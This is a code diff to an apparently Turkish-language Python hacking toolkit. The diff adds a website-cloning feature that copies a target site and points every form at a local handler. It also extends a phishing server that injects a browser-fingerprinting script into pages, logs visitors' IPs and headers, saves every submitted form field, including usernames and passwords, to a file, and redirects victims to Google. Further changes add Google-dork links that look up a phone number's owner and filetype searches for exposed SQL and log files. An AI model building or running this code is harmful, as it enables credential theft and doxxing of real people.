@@ -1,4 +1,4 @@
-import platform, os, subprocess, time, socket, threading, json, urllib.request, random, sys, warnings, logging, atexit, requests
+import platform, os, subprocess, time, socket, threading, json, urllib.request, urllib.parse, random, sys, warnings, logging, atexit, requests
 
 logging.getLogger("scapy").setLevel(logging.ERROR)
 warnings.filterwarnings("ignore", message="No libpcap")
@@ -152,6 +152,12 @@ DIL = {
         "telefon_no_gir": "Telefon numarası (05XX, Enter=iptal)",
         "kac_sonuc": "Kaç sonuç istiyorsun?",
         "kaydet_sor": "Sonuçlar kaydedilsin mi?",
+        "site_klonla": "Site Klonla (Gerçek Sayfa Kopyala)",
+        "hedef_url": "Hedef URL (https://...)",
+        "sayfa_adi": "Sayfa adı",
+        "klonlaniyor": "{site} klonlanıyor...",
+        "kaynak_indir": "{url} indiriliyor...",
+        "klon_basarili": "{site} başarıyla klonlandı!",
     },
     "EN": {
         "ana_menu": "Main Menu",
@@ -277,6 +283,12 @@ DIL = {
         "telefon_no_gir": "Phone number (05XX, Enter=cancel)",
         "kac_sonuc": "How many results?",
         "kaydet_sor": "Save results?",
+        "site_klonla": "Clone Site (Real Page Copy)",
+        "hedef_url": "Target URL (https://...)",
+        "sayfa_adi": "Page name",
+        "klonlaniyor": "Cloning {site}...",
+        "kaynak_indir": "Downloading {url}...",
+        "klon_basarili": "{site} cloned successfully!",
     }
 }
 def _(anahtar): return DIL.get(LANG, DIL["TR"]).get(anahtar, anahtar)
@@ -313,7 +325,8 @@ def cizgi():
     print(f"  {W}{'─'*30}{S}")
 
 def baslik(txt):
-    print(f"\n  {W}{'>>'} {txt.upper()} {'<<'}{S}\n")
+    clear_screen()
+    print(f"  {W}{'>>'} {txt.upper()} {'<<'}{S}\n")
 
 def info(m):
     print(f"{C}  [>]{S} {m}")
@@ -342,7 +355,10 @@ def soru(prompt, default=None):
 
 def secim_menu(ops):
     print()
+    gordu = False
     for k, v in ops:
+        if k in ("L", "0") and not gordu:
+            print(); gordu = True
         renk = R if k == "0" else W
         print(f"  {renk}[{k}]{S} {v}")
     return input(f"\n  {W}>{S} ")
@@ -1509,25 +1525,57 @@ def telefon_osint():
     ok(f"  {_('operator')}: {OPERATOR_MAP.get(no[:3], 'Bilinmiyor')}")
     ok(f"  Ulusal: 0{no}")
     ok(f"  Uluslararası: +90{no}")
-    ts = time.strftime("%Y%m%d_%H%M%S")
-    dosya = f"osint-{no}-{ts}.txt"
-    with open(dosya, "w", encoding="utf-8") as f:
-        f.write(f"Telefon: +90{no}\nUlke: +90 (Turkiye)\nOperator: {OPERATOR_MAP.get(no[:3], 'Bilinmiyor')}\n")
-        f.write(f"Ulusal: 0{no}\nUluslararasi: +90{no}\nTarih: {time.strftime('%Y-%m-%d %H:%M:%S')}\n")
-    ok(_("kaydedildi").format(dosya=dosya))
+    print()
+    dorklar = [
+        ("tel: ile", f'tel:+90{no}'),
+        ("Inurl", f'inurl:+90{no}'),
+        ("Uluslararası", f'"+90{no}"'),
+        ("Ulusal", f'"0{no}"'),
+        ("Duz", f'"{no}"'),
+        ("Parçalı", f'"0 ({no[:3]}) {no[3:6]} {no[6:8]} {no[8:]}"'),
+    ]
+    ok("Google dork linkleri:")
+    for ad, dork in dorklar:
+        link = f"https://www.google.com/search?q={urllib.parse.quote(dork)}"
+        print(f"  {W}{ad}:{S} {link}")
+    print()
+    if soru(f"  {_('kaydet_sor')} (E/h)", "E").strip().lower() in ("", "e", "evet", "y", "yes"):
+        ts = time.strftime("%Y%m%d_%H%M%S")
+        dosya = f"osint-{no}-{ts}.txt"
+        with open(dosya, "w", encoding="utf-8") as f:
+            f.write(f"Telefon: +90{no}\nOperator: {OPERATOR_MAP.get(no[:3], 'Bilinmiyor')}\n\n")
+            for ad, dork in dorklar:
+                f.write(f"[{ad}] {dork}\nhttps://www.google.com/search?q={urllib.parse.quote(dork)}\n\n")
+        ok(_("kaydedildi").format(dosya=dosya))
     input(f"\n  {Y}{_('enter')}{S} ")
 
 def google_dorking():
     baslik(_("google_dorking"))
     dork = input(f"  {_('dork_sorgu')}: ").strip()
     if not dork: return
+    ft_list = [
+        ("1", "PDF", "pdf"), ("2", "Word (DOC/DOCX)", 'doc OR docx'),
+        ("3", "Excel (XLS/XLSX)", 'xls OR xlsx'),
+        ("4", "PowerPoint (PPT/PPTX)", 'ppt OR pptx'),
+        ("5", "TXT", "txt"), ("6", "CSV", "csv"),
+        ("7", "JSON", "json"), ("8", "XML", "xml"),
+        ("9", "ZIP/RAR", 'zip OR rar'), ("10", "SQL", "sql"),
+        ("11", "LOG", "log"), ("0", _("tumu")),
+    ]
+    ok("Dosya türü seçin:")
+    for num, etiket, _ in ft_list:
+        print(f"  {W}{num}.{S} {etiket}")
+    sec = input(f"  {_('secim')}: ").strip()
+    ft_map = {num: ft for num, _, ft in ft_list}
+    filetype = ft_map.get(sec, "")
+    sorgu = f"{dork} filetype:{filetype}" if filetype else dork
     try: limit = int(input(f"  {_('kac_sonuc')} (1-50): ").strip() or "15")
     except: limit = 15
     if limit < 1: limit = 15
     warn(f"  Google'da {_('web_ara')} taranıyor...")
     try:
         h = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36"}
-        r = requests.get(f"https://www.google.com/search?q={urllib.parse.quote(dork)}&num={limit}", headers=h, timeout=15)
+        r = requests.get("https://www.google.com/search", params={"q": sorgu, "num": limit}, headers=h, timeout=15)
         if r.status_code != 200:
             fail(f"Google yanit vermedi (HTTP {r.status_code})"); input(f"  {Y}{_('enter')}{S} "); return
         from bs4 import BeautifulSoup
@@ -1557,17 +1605,19 @@ def google_dorking():
             input(f"  {Y}{_('enter')}{S} "); return
         sonuclar = sonuclar[:limit]
         for i, (ba, li) in enumerate(sonuclar, 1):
-            print(f"  {ba}")
-            print(f"  {li}\n")
+            print(f"  {W}{i}.{S} {ba}")
+            print(f"     {li}")
+        print()
         ok(f"{len(sonuclar)} {_('sonuc_sayisi')}")
-        if soru(f"  {_('kaydet_sor')} (E/h)", "E").strip().lower() in ("", "e", "evet", "y", "yes"):
-                ts = time.strftime("%Y%m%d_%H%M%S")
-                dosya = f"osint-dork-{ts}.txt"
-                with open(dosya, "w", encoding="utf-8") as f:
-                    f.write(f"Dork: {dork}\nTarih: {time.strftime('%Y-%m-%d %H:%M:%S')}\n{'-'*50}\n")
-                    for bas, link in sonuclar:
-                        f.write(f"{bas}\n{link}\n\n")
-                ok(_("kaydedildi").format(dosya=dosya))
+        if soru(f"  Kaydedilsin mi? (E/h)", "E").strip().lower() in ("", "e", "evet", "y", "yes"):
+            ts = time.strftime("%Y%m%d_%H%M%S")
+            ek = filetype.replace(" OR ", "-") if filetype else "genel"
+            dosya = f"osint-dork-{ek}-{ts}.txt"
+            with open(dosya, "w", encoding="utf-8") as f:
+                f.write(f"Dork: {sorgu}\nTarih: {time.strftime('%Y-%m-%d %H:%M:%S')}\n{'-'*50}\n")
+                for bas, link in sonuclar:
+                    f.write(f"{bas}\n{link}\n\n")
+            ok(_("kaydedildi").format(dosya=dosya))
     except:
         fail(_("hata"))
     input(f"  {Y}{_('enter')}{S} ")
@@ -1654,6 +1704,106 @@ def fake_page_olustur():
     ok(_("saf_page_kaydedildi").format(dosya=dosya))
     _son_sayfa = dosya
 
+def site_klonla():
+    global _son_sayfa
+    baslik(_("site_klonla"))
+    target = soru(f"  {_('hedef_url')}")
+    if not target: return
+    if not target.startswith("http"):
+        target = "https://" + target
+    from urllib.parse import urlparse, urljoin
+    parsed = urlparse(target)
+    site_adi = parsed.netloc.replace("www.", "").split(".")[0]
+    info(_("klonlaniyor").format(site=target))
+    base = f"sites/{site_adi}"
+    os.makedirs(base, exist_ok=True)
+    ua = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/125.0.0.0 Safari/537.36"
+
+    html = None
+    try:
+        import selenium.webdriver as wd
+        import selenium.webdriver.chrome.options as opts
+        o = opts.Options()
+        o.add_argument("--headless"); o.add_argument("--no-sandbox"); o.add_argument("--disable-dev-shm-usage")
+        o.add_argument(f"user-agent={ua}")
+        d = wd.Chrome(options=o)
+        d.get(target)
+        from time import sleep
+        sleep(3)
+        html = d.page_source
+        d.quit()
+        ok("Selenium ile sayfa render edildi")
+    except ImportError:
+        warn("Selenium yok, requests ile deneniyor...")
+    except Exception as e:
+        warn(f"Selenium: {e}, requests deneniyor...")
+
+    if not html:
+        try:
+            r = requests.get(target, headers={"User-Agent": ua}, timeout=20)
+            if r.status_code != 200:
+                fail(f"HTTP {r.status_code}"); input(f"  {Y}{_('enter')}{S} "); return
+            html = r.text
+        except Exception as e:
+            fail(f"{_('hata')}: {e}"); input(f"  {Y}{_('enter')}{S} "); return
+
+    try:
+        from bs4 import BeautifulSoup
+        import re
+        soup = BeautifulSoup(html, "html.parser")
+        indirilen = set()
+
+        def kaynak_indir(url, base_url=target):
+            if url in indirilen or not url: return None
+            indirilen.add(url)
+            full = urljoin(base_url, url)
+            parsed_u = urlparse(full)
+            path = parsed_u.path.lstrip("/")
+            if not path or path.endswith("/"): return None
+            local = f"{base}/{path}"
+            os.makedirs(os.path.dirname(local), exist_ok=True)
+            try:
+                rr = requests.get(full, headers={"User-Agent": ua}, timeout=10)
+                if rr.status_code == 200:
+                    with open(local, "wb") as f:
+                        f.write(rr.content)
+                    if full.endswith(".css"):
+                        css_text = rr.text
+                        for m in re.finditer(r'url\(["\']?([^"\'()]+)["\']?\)', css_text):
+                            css_url = m.group(1)
+                            if css_url.startswith("data:"): continue
+                            local_css = kaynak_indir(css_url, full)
+                            if local_css:
+                                css_text = css_text.replace(m.group(0), f'url("{local_css}")')
+                        with open(local, "w", encoding="utf-8") as f:
+                            f.write(css_text)
+                    return f"/{path}"
+            except:
+                return None
+
+        for tag, attr in [("link", "href"), ("script", "src"), ("img", "src"),
+                          ("source", "src"), ("video", "src"), ("audio", "src")]:
+            for el in soup.find_all(tag):
+                url = el.get(attr)
+                if url and not url.startswith("data:") and not url.startswith("#"):
+                    local = kaynak_indir(url)
+                    if local:
+                        el[attr] = local
+
+        for el in soup.find_all("form"):
+            el["action"] = "/submit"
+
+        idx_path = f"{base}/index.html"
+        with open(idx_path, "w", encoding="utf-8") as f:
+            f.write(str(soup))
+        _son_sayfa = idx_path
+        ok(_("klon_basarili").format(site=site_adi))
+        ok(_("kaydedildi").format(dosya=idx_path))
+        warn("Form bilgileri phishing_kayitlar.txt dosyasina kaydedilecek")
+    except Exception as e:
+        fail(f"{_('hata')}: {e}")
+    input(f"  {Y}{_('enter')}{S} ")
+
 def phishing_server():
     baslik(_("phishing_server"))
     global _son_sayfa
@@ -1665,9 +1815,11 @@ def phishing_server():
     try: port = int(port)
     except: port = 8080
     cf = input(f"  {W}{_('cloudflare_sor')}{S} {Y}(E/h):{S} ").strip().lower()
+    kaydet = soru(_("kaydet_sor"), "E").strip().lower() in ("", "e", "evet", "y", "yes")
     from http.server import HTTPServer, BaseHTTPRequestHandler
     import urllib.parse
     os.makedirs("sites", exist_ok=True)
+    site_root = os.path.dirname(_son_sayfa) if "/" in _son_sayfa else "sites"
     class Handler(BaseHTTPRequestHandler):
         def log_message(self, *a): pass
         def vizitor_kaydet(self, ekstra=""):
@@ -1686,26 +1838,31 @@ def phishing_server():
             except: pass
             if ekstra:
                 info(ekstra[:120])
-            ts = time.strftime("%Y%m%d_%H%M%S")
-            with open("phishing_kayitlar.txt", "a", encoding="utf-8") as f:
-                f.write(f"[{ts}] {_('vizitor_bilgi')}: {ip} | {ua}\n")
-                for h, v in self.headers.items():
-                    f.write(f"  {h}: {v}\n")
-                if ekstra:
-                    f.write(f"  {ekstra}\n")
-                f.write("\n")
-        def do_GET(self):
-            if self.path.startswith("/track"):
-                q = urllib.parse.parse_qs(urllib.parse.urlparse(self.path).query)
-                ekstra = "; ".join(f"{k}={v[0]}" for k, v in q.items())
-                self.vizitor_kaydet(ekstra)
-                self.send_response(200)
-                self.end_headers()
+            if kaydet:
+                ts = time.strftime("%Y%m%d_%H%M%S")
+                with open("phishing_kayitlar.txt", "a", encoding="utf-8") as f:
+                    f.write(f"[{ts}] {_('vizitor_bilgi')}: {ip} | {ua}\n")
+                    for h, v in self.headers.items():
+                        f.write(f"  {h}: {v}\n")
+                    if ekstra:
+                        f.write(f"  {ekstra}\n")
+                    f.write("\n")
+        def dosya_serv(self, path):
+            if path == "/":
+                path = "/index.html"
+            local = site_root + path
+            if not os.path.exists(local):
+                self.send_error(404)
                 return
-            self.vizitor_kaydet()
-            try:
-                with open(_son_sayfa, "rb") as f:
-                    data = f.read()
+            ext = os.path.splitext(path)[1].lower()
+            mime = {"html": "text/html", "css": "text/css", "js": "application/javascript",
+                    "png": "image/png", "jpg": "image/jpeg", "jpeg": "image/jpeg",
+                    "gif": "image/gif", "svg": "image/svg+xml", "ico": "image/x-icon",
+                    "woff": "font/woff", "woff2": "font/woff2", "ttf": "font/ttf",
+                    "json": "application/json", "txt": "text/plain"}.get(ext, "application/octet-stream")
+            with open(local, "rb") as f:
+                data = f.read()
+            if ext in ("html", "htm"):
                 js = b"""<script>
 fetch('/track?'+new URLSearchParams({
   ekran:screen.width+'x'+screen.height,
@@ -1715,24 +1872,35 @@ fetch('/track?'+new URLSearchParams({
 }));
 </script>"""
                 data = data.replace(b"</head>", js + b"</head>")
+            self.send_response(200)
+            self.send_header("Content-Type", mime)
+            self.end_headers()
+            self.wfile.write(data)
+        def do_GET(self):
+            if self.path.startswith("/track"):
+                q = urllib.parse.parse_qs(urllib.parse.urlparse(self.path).query)
+                ekstra = "; ".join(f"{k}={v[0]}" for k, v in q.items())
+                self.vizitor_kaydet(ekstra)
                 self.send_response(200)
-                self.send_header("Content-Type", "text/html; charset=utf-8")
                 self.end_headers()
-                self.wfile.write(data)
-            except:
-                self.send_error(404)
+                return
+            self.vizitor_kaydet()
+            self.dosya_serv(self.path)
         def do_POST(self):
             self.vizitor_kaydet()
             try:
                 length = int(self.headers.get("Content-Length", 0))
                 body = self.rfile.read(length).decode("utf-8")
                 params = urllib.parse.parse_qs(body)
-                k = params.get("kullanici", [""])[0]
-                s = params.get("sifre", [""])[0]
-                ok(_("kullanici_ekle").format(k=k, s=s))
-                ts = time.strftime("%Y%m%d_%H%M%S")
-                with open("phishing_kayitlar.txt", "a", encoding="utf-8") as f:
-                    f.write(f"[{ts}] {_('kullanici_ekle').format(k=k, s=s)}\n\n")
+                alanlar = "; ".join(f"{k}={v[0]}" for k, v in params.items())
+                ok(f"  FORM: {alanlar[:150]}")
+                if kaydet:
+                    ts = time.strftime("%Y%m%d_%H%M%S")
+                    with open("phishing_kayitlar.txt", "a", encoding="utf-8") as f:
+                        f.write(f"[{ts}] {self.path}\n")
+                        for k, v in params.items():
+                            f.write(f"  {k}: {v[0]}\n")
+                        f.write("\n")
             except: pass
             self.send_response(302)
             self.send_header("Location", "https://www.google.com")
@@ -1795,14 +1963,17 @@ fetch('/track?'+new URLSearchParams({
 _son_sayfa = ""
 
 def phishing_menu():
+    global LANG
     while True:
         baslik(_("phishing_baslik"))
-        menu_items = [("1", _("saf_page_olustur")), ("2", _("phishing_server")), ("0", _("onceki"))]
+        menu_items = [("1", _("saf_page_olustur")), ("2", _("site_klonla")),
+                      ("3", _("phishing_server")), ("0", _("onceki"))]
         secim = secim_menu(menu_items)
         if secim.upper() == "L":
             LANG = "EN" if LANG == "TR" else "TR"; continue
         if secim == "1": fake_page_olustur()
-        elif secim == "2": phishing_server()
+        elif secim == "2": site_klonla()
+        elif secim == "3": phishing_server()
         elif secim == "0": return "Home"
 
 # --| Bagimlilik Kontrolu |-- #
